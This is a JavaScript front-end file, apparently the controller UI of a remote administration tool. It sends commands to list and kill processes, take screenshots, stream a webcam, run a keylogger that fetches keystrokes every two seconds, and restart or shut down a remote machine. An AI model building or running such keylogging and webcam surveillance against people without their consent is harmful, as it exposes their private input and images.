/**
 * commands.js - Command Functions
 * All functions that send commands to the server
 */

// --- PROCESS & APPLICATION COMMANDS ---

// Nút 1 & 2: Yêu cầu danh sách
function requestList(type) {
    logStatus("Đang tải danh sách...");
    if (type === "LIST_APPS") {
        // Send APPLICATION_LIST command per API contract
        sendToGateway({ command: "APPLICATION_LIST" });
    } else {
        // Send PROCESS_LIST command per API contract
        sendToGateway({ command: "PROCESS_LIST" });
    }
}

// Nút: Start App (Gọi từ ô input)
function startApp() {
    const appInput = document.getElementById('app-path');
    const appName = appInput.value.trim();
    
    if (appName) {
        // Send APPLICATION_START command per API contract
        sendToGateway({ command: "APPLICATION_START", processName: appName });
        logStatus("Đã gửi lệnh mở ứng dụng: " + appName);
        appInput.value = ''; // Xóa ô nhập sau khi gửi
    } else {
        alert("Vui lòng nhập tên ứng dụng!");
    }
}

// Nút: Start Process (Gọi từ ô input)
function startProcess() {
    const appInput = document.getElementById('app-path');
    const processName = appInput.value.trim();
    
    if (processName) {
        // Send PROCESS_START command per API contract
        sendToGateway({ command: "PROCESS_START", processName: processName });
        logStatus("Đã gửi lệnh mở tiến trình: " + processName);
        appInput.value = ''; // Xóa ô nhập sau khi gửi
    } else {
        alert("Vui lòng nhập tên tiến trình!");
    }
}

// Nút: Kill Process (Gọi từ nút trong bảng)
function killProcess(target, type = 'PID', isApplication = false) {
    // Hỏi xác nhận
    if (!confirm(`Bạn muốn tắt ${type}: ${target}?`)) return;

    if (isApplication) {
        // Send APPLICATION_KILL command per API contract
        sendToGateway({ 
            command: "APPLICATION_KILL", 
            processId: parseInt(target)
        });
    } else {
        // Send PROCESS_KILL command per API contract
        sendToGateway({ 
            command: "PROCESS_KILL", 
            processId: parseInt(target)
        });
    }
}

// --- MEDIA COMMANDS ---

// Nút 3: Screenshot
function requestScreenshot() {
    // Clear old screenshot image and set waiting flag - DON'T switch view yet
    const screenshotImg = document.getElementById('monitor-img');
    if (screenshotImg) {
        screenshotImg.src = ''; // Clear old screenshot image
    }
    isWaitingForScreenshot = true;
    sendToGateway({ command: 'TAKEPIC' });
    logStatus("Đang yêu cầu chụp màn hình... Đợi nhận ảnh...");
}

// Nút 4: Webcam Toggle
function toggleWebcam() {
    switchView('view-media', 'Webcam Trực tiếp');
    
    if (!isWebcamOn) {
        // Bật Webcam - Clear old image and DON'T update UI yet, wait for first frame
        const webcamImg = document.getElementById('monitor-img');
        if (webcamImg) {
            webcamImg.src = ''; // Clear old screenshot image
        }
        isWaitingForWebcamFrame = true;
        sendToGateway({ command: 'WEBCAM_START', frameRate: 10 });
        logStatus("Đang bật Webcam... Đợi nhận frame đầu tiên...");
    } else {
        // Tắt Webcam - update UI immediately on button press
        isWebcamOn = false;
        isWaitingForWebcamFrame = false;
        updateWebcamButton();
        // Clear the image when stopping webcam
        const webcamImg = document.getElementById('monitor-img');
        if (webcamImg) {
            webcamImg.src = '';
        }
        sendToGateway({ command: 'WEBCAM_STOP' });
        logStatus("Đã gửi lệnh tắt Webcam.");
    }
}

// Update webcam button UI based on state
function updateWebcamButton() {
    const btn = document.getElementById('btn-webcam');
    if (!btn) return;
    
    if (isWebcamOn) {
        btn.innerText = "4. Tắt Webcam";
        btn.classList.remove('btn-info');
        btn.classList.add('btn-warning');
    } else {
        btn.innerText = "4. Bật Webcam";
        btn.classList.remove('btn-warning');
        btn.classList.add('btn-info');
    }
}

// --- WEBCAM STATE MANAGER ---
// Centralized webcam control - automatically turns off webcam when other buttons are pressed
// This maintains separation of concerns by not modifying individual command functions

/**
 * Turns off webcam if it's currently on
 * This is a pure function that only manages webcam state
 */
function turnOffWebcamIfOn() {
    if (isWebcamOn || isWaitingForWebcamFrame) {
        // Turn off webcam
        isWebcamOn = false;
        isWaitingForWebcamFrame = false;
        updateWebcamButton();
        // Clear the image when stopping webcam
        const webcamImg = document.getElementById('monitor-img');
        if (webcamImg) {
            webcamImg.src = '';
        }
        sendToGateway({ command: 'WEBCAM_STOP' });
    }
}

/**
 * Initializes event delegation to automatically turn off webcam / keylogger
 * when other buttons are clicked.
 *
 * This intercepts button clicks and turns off webcam/keylogger before the
 * original handler runs.
 *
 * The webcam & keylogger buttons themselves are excluded from this behavior.
 * Handles both sidebar buttons and dynamically created buttons (e.g., kill
 * buttons in table).
 */
function initWebcamAutoOff() {
    const container = document.querySelector('.container');
    if (!container) return;
    
    // Use event delegation to catch all button clicks in the container
    // This includes sidebar buttons and dynamically created buttons in the table
    container.addEventListener('click', function(event) {
        // Find the clicked button (event might bubble from child elements)
        const button = event.target.closest('button');
        if (!button) return;
        
        // Exclude the webcam and keylogger buttons themselves
        if (
            button.id === 'btn-webcam' ||
            button.id === 'btn-keylog-start' ||
            button.id === 'btn-keylog-stop' ||
            button.id === 'btn-keylog-clear' ||
            button.id === 'btn-keylog-print'
        ) {
            return;
        }
        
        // Turn off webcam / keylogger if they're on (before the original onclick handler executes)
        turnOffWebcamIfOn();
        turnOffKeylogIfOn();
        
        // Note: The original onclick handler will still execute normally
        // This just ensures webcam/keylogger are turned off first
    });
}

// --- KEYLOGGER COMMANDS ---

// Nút 5: Keylog - Start
function startKeylog() {
    switchView('view-keylog', 'Nhật ký bàn phím (Keylogger)');
    sendToGateway({ command: 'KEYLOG_HOOK' });
    
    // Optimistic update: assume command will succeed
    isKeyloggerActive = true;
    updateKeylogButtons();
    logStatus("Đang bật keylogger...");
    
    // Start auto-refresh every 2 seconds to fetch keystrokes
    if (!keylogAutoRefreshTimer) {
        keylogAutoRefreshTimer = setInterval(() => {
            if (isKeyloggerActive) {
                retrieveKeylog();
            }
        }, 2000);
    }
}

// Nút 5b: Stop Keylogger
function stopKeylog() {
    sendToGateway({ command: 'KEYLOG_UNHOOK' });
    
    // Optimistic update: assume command will succeed
    isKeyloggerActive = false;
    updateKeylogButtons();
    logStatus("Đang tắt keylogger...");
    
    // Stop auto-refresh if running
    if (keylogAutoRefreshTimer) {
        clearInterval(keylogAutoRefreshTimer);
        keylogAutoRefreshTimer = null;
    }
}

// Nút 5c: Retrieve Keylog
function retrieveKeylog() {
    sendToGateway({ command: 'KEYLOG_PRINT' });
    logStatus("Đang lấy keystroke từ server...");
}

// Nút 5d: Clear Keylog Display
function clearKeylog() {
    const textArea = document.getElementById('keylog-area');
    if (textArea) {
        textArea.value = '';
        logStatus("Đã xóa màn hình keylog.");
    }
}

// Update keylog button visibility based on state
function updateKeylogButtons() {
    const btnStart = document.getElementById('btn-keylog-start');
    const btnStop = document.getElementById('btn-keylog-stop');
    const btnPrint = document.getElementById('btn-keylog-print');
    const btnClear = document.getElementById('btn-keylog-clear');
    
    if (isKeyloggerActive) {
        // Keylogger is running
        if (btnStart) btnStart.style.display = 'none';
        if (btnStop) btnStop.style.display = 'block';
        if (btnPrint) btnPrint.style.display = 'block';
        if (btnClear) btnClear.style.display = 'block';
    } else {
        // Keylogger is stopped
        if (btnStart) btnStart.style.display = 'block';
        if (btnStop) btnStop.style.display = 'none';
        if (btnPrint) btnPrint.style.display = 'none';
        if (btnClear) btnClear.style.display = 'none'; // Hide clear button when keylogger is off
    }
}

// --- KEYLOGGER STATE MANAGER ---
// Centralized keylogger control - automatically turns off keylogger when other buttons are pressed
// This keeps command handlers focused only on sending commands, not on global coordination.

/**
 * Turns off keylogger if it's currently on.
 * Sends the unhook command, updates UI state, and stops the auto-refresh timer.
 */
function turnOffKeylogIfOn() {
    if (!isKeyloggerActive) return;

    // Send unhook command to agent
    sendToGateway({ command: 'KEYLOG_UNHOOK' });

    // Update local state & UI
    isKeyloggerActive = false;
    updateKeylogButtons();

    // Stop auto-refresh if running
    if (keylogAutoRefreshTimer) {
        clearInterval(keylogAutoRefreshTimer);
        keylogAutoRefreshTimer = null;
    }

    logStatus("Đang tắt keylogger (tự động do chuyển chức năng)...");
}

// --- SYSTEM COMMANDS ---

// Nút 6 & 7: Restart / Shutdown
function confirmAction(commandName) {
    const actionMap = { 
        'RESTART': 'Khởi động lại', 
        'SHUTDOWN': 'Tắt nguồn' 
    };
    
    const message = `CẢNH BÁO NGUY HIỂM:\nBạn có chắc chắn muốn ${actionMap[commandName]} máy trạm không?\nHành động này sẽ làm mất kết nối ngay lập tức.`;
    
    if (confirm(message)) {
        sendToGateway({ command: commandName });
        logStatus(`Đã gửi lệnh ${commandName}... Tạm biệt!`);
    }
}

